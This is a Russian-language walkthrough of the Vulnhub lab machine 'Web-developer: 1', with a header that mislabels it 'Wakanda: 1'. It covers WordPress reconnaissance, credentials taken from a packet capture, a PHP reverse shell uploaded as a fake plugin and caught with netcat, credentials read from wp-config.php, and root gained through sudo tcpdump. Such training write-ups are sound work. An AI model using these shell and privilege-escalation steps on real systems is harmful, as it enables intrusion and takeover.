# Web-developer: 1
## Vulnhub machine

- Название: Wakanda: 1
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Beginning
- Дата релиза: 5.11.18
- Оригинальное описание: 
>A machine using the newest REMOVED Server, the newest REMOVED and containing some REMOVED....


## Write-up

```html
root@kali:~# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 08:00:27:33:75:72, IPv4: 192.168.56.109
Starting arp-scan 1.9.6 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:27:4f:b3       PCS Systemtechnik GmbH
192.168.56.116  08:00:27:cc:54:c9       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.6: 256 hosts scanned in 2.145 seconds (119.35 hosts/sec). 3 responded

root@kali:~# nmap -sC -sV 192.168.56.116
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-29 07:45 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.116
Host is up (0.00020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb (RSA)
|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d (ECDSA)
|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 4.9.8
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Example site &#8211; Just another WordPress site
MAC Address: 08:00:27:CC:54:C9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
```

>Машина базируется на wordpress, в целом похожа на Ha-wordy, но открыт 22 порт. Попробуем wpscan.

```html 
root@kali:~# wpscan --url http://192.168.56.116
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.56.116/
[+] Started: Sun Mar 29 08:29:41 2020

Interesting Finding(s):

[+] http://192.168.56.116/
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.56.116/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.56.116/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.116/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.56.116/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.116/index.php/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>
 |  - http://192.168.56.116/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://192.168.56.116/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-02-25T00:00:00.000Z
 | Readme: http://192.168.56.116/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://192.168.56.116/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.116/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.

[+] Finished: Sun Mar 29 08:29:47 2020
[+] Requests Done: 61
[+] Cached Requests: 5
[+] Data Sent: 12.734 KB
[+] Data Received: 12.203 MB
[+] Memory used: 206.823 MB
[+] Elapsed time: 00:00:05
```

>Ничего интересного, даже устаревших плагинов нет. Идем дальше:

```html
root@kali:~# dirb http://192.168.56.116/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar 29 07:46:26 2020
URL_BASE: http://192.168.56.116/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.116/ ----
+ http://192.168.56.116/index.php (CODE:301|SIZE:0)                            
==> DIRECTORY: http://192.168.56.116/ipdata/                                
+ http://192.168.56.116/server-status (CODE:403|SIZE:302)                      
==> DIRECTORY: http://192.168.56.116/wp-admin/                                 
==> DIRECTORY: http://192.168.56.116/wp-content/                               
==> DIRECTORY: http://192.168.56.116/wp-includes/                              
+ http://192.168.56.116/xmlrpc.php (CODE:405|SIZE:42)
```

>Нестандартная папка, в ней лежит файл с расширением .cap, откроем его с помощью wireshark. В одном из пакетов можно найти запрос к админке, в котором указаны логин и пароль. Подсказка - нужно искать POST запрос.

```html
Form item: "log" = "webdeveloper"
Form item: "pwd" = "Te5eQg&4sBS!Yr**********"
```

>Войдем в админку и сразу переходим во вкладку плагины. Чтобы получить шелл, нам нужно поставить уязвимый плагин. Изначально я скачал архив "reflex gallery 3.1.3", загрузил его и использовал metasploit (подробнее можно почитать в райтапе к машине "Ha-wordy"), но никак не выходило получить сеанс meterpreter. Тогда я распаковал архив с плагином и заменил содержимое файла reflex-gallery.php на php-reverse-shell.php(не забудь указать свой адрес в файле, вместо 127.0.0.1). Шелл можно найти с помощью команды:

>locate php-reverse-shell.php

>Снова заархивировал папку с плагином и загрузил ее. Заранее включим слушатель:

```html
root@kali:~# nc -lvp 1234
```

>И обратимся по адресу загруженного файла reflex-gallery.php:

>http://192.168.56.116/wp-content/upgrade/reflex-gallery-shell/reflex-gallery.php

>Иногда это занимает секунду, иногда больше:

```html
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
192.168.56.116: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.109] from (UNKNOWN) [192.168.56.116] 44012
Linux webdeveloper 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 13:15:11 up  1:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@webdeveloper:/$
```

>Идем дальше:

```html 
www-data@webdeveloper://var/www/html$ cat wp-config.php

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'webdeveloper');

/** MySQL database password */
define('DB_PASSWORD', 'MasterOfT**********');
```

>С помощью полученного пароля, заходим как webdeveloper:

```html
root@kali:~# ssh webdeveloper@192.168.56.116
The authenticity of host '192.168.56.116 (192.168.56.116)' can't be established.
ECDSA key fingerprint is SHA256:qgNlWWIX9wv+iLg9Bqpq+ENCHqG3lhlsM1bMQJygYDM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.116' (ECDSA) to the list of known hosts.
webdeveloper@192.168.56.116's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar 29 13:23:39 UTC 2020

  System load:  0.0                Processes:           101
  Usage of /:   23.3% of 19.56GB   Users logged in:     0
  Memory usage: 38%                IP address for eth0: 192.168.56.116
  Swap usage:   0%


275 packages can be updated.
175 updates are security updates.


Last login: Tue Oct 30 09:25:27 2018 from 192.168.1.114
webdeveloper@webdeveloper:~$ id
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
```

>Теперь мы имеем права юзера webdeveloper. Посмотрим, что мы можем запускать от root:

```html
webdeveloper@webdeveloper://$ sudo -l
Matching Defaults entries for webdeveloper on webdeveloper:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

>Только команду tcpdump, используем это. Создадим пустой файл и впишем в него команду:

```html
webdeveloper@webdeveloper:~$ touch /tmp/shell
webdeveloper@webdeveloper:~$ echo "cat /root/flag.txt" > /tmp/shell
```

>Сделаем файл исполняемым и запустим:

```html
webdeveloper@webdeveloper:~$ chmod +x /tmp/shell
webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
[sudo] password for webdeveloper: 
dropped privs to root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
13 packets received by filter
0 packets dropped by kernel
webdeveloper@webdeveloper:~$ Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b**********
```

>Если интересно, вот здесь можно почитать подробнее -- https://gtfobins.github.io/gtfobins/tcpdump/

>Так же я пытался получить root через lxd, но неправильно эксплуатировал и получил кучу ошибок, в любом случае оставлю ссылку.

```html
webdeveloper@webdeveloper://$ id
uid=1000(webdeveloper) gid=1000(webdeveloper) groups=1000(webdeveloper),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)

webdeveloper@webdeveloper://$ cat etc/passwd
<mark>lxd:x:105:65534::/var/lib/lxd/:/bin/false
```

>Повышение привилегий через LXD -- https://reboare.github.io/lxd/lxd-escape.html
